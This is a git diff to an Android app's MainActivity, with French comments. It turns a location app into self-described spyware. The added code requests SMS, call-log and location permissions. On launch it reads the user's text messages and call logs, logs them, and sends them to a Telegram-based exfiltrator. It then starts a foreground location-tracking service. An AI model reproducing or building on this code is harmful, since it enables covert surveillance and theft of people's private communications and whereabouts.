@@ -13,17 +13,32 @@ import androidx.core.content.ContextCompat;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final int LOCATION_PERMISSION_REQUEST_CODE = 100;
+    private static final int PERMISSION_REQUEST_CODE = 101;
+    private static final String TAG = "MainActivity";
+
+    // Toutes les permissions nécessaires pour le spyware
+    private static final String[] REQUIRED_PERMISSIONS = new String[]{
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.RECEIVE_SMS
+    };
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
+        Log.d("MainActivity", "onCreate");
         // Vérifie directement la permission
-        if (hasLocationPermission()) {
-            startLocationService(); // Démarre la localisation si déjà accordée
+        if (hasAllPermissions()) {
+            Log.d("MainActivity", "Permission accordée, on lance le service");; // Démarre la localisation si déjà accordée
+            Log.d("MainActivity", "SMS : " + ComCollector.readSMS(this));
+            Log.d("MainActivity", "Call Logs : " + ComCollector.readCallLogs(this));
+            TelegramExfiltrator.sendTexte(ComCollector.readSMS(this));
+            TelegramExfiltrator.sendTexte(ComCollector.readCallLogs(this));
+            startLocationService();
         } else {
-            requestLocationPermission(); // Demande la permission sinon
+            requestAllPermissions(); // Demande la permission sinon
+            Log.d("MainActivity", "Demande de permission");
         }
     }
 
@@ -34,17 +49,35 @@ public class MainActivity extends AppCompatActivity {
         ) == PackageManager.PERMISSION_GRANTED;
     }
 
+    private boolean hasAllPermissions() {
+        for (String permission : REQUIRED_PERMISSIONS) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return true;
+    }
+
     private void requestLocationPermission() {
         ActivityCompat.requestPermissions(
                 this,
                 new String[]{Manifest.permission.ACCESS_FINE_LOCATION},
-                LOCATION_PERMISSION_REQUEST_CODE
+                100
         );
+    }
+
+    private void requestAllPermissions() {
+        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
     }
 
     private void startLocationService() {
         Intent intent = new Intent(this, LocalisationService.class);
-        startService(intent);
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+            Log.d("MainActivity", "Démarrage du service en foreground.");
+            startForegroundService(intent); // ✅ Pour Android 8+
+        } else {
+            startService(intent); // ✅ Pour Android < 8
+        }
     }
 
     // Callback pour gérer la réponse à la demande de permission
@@ -55,12 +88,12 @@ public class MainActivity extends AppCompatActivity {
             @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
-        if (requestCode == LOCATION_PERMISSION_REQUEST_CODE) {
+        if (requestCode == PERMISSION_REQUEST_CODE) {
             if (grantResults.length > 0
                     && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 startLocationService(); // Permission accordée, on lance le service
             } else {
-                Log.d("MainActivity", "Permission de localisation refusée");
+                Log.d("MainActivity", "Permission refusée");
             }
         }
     }
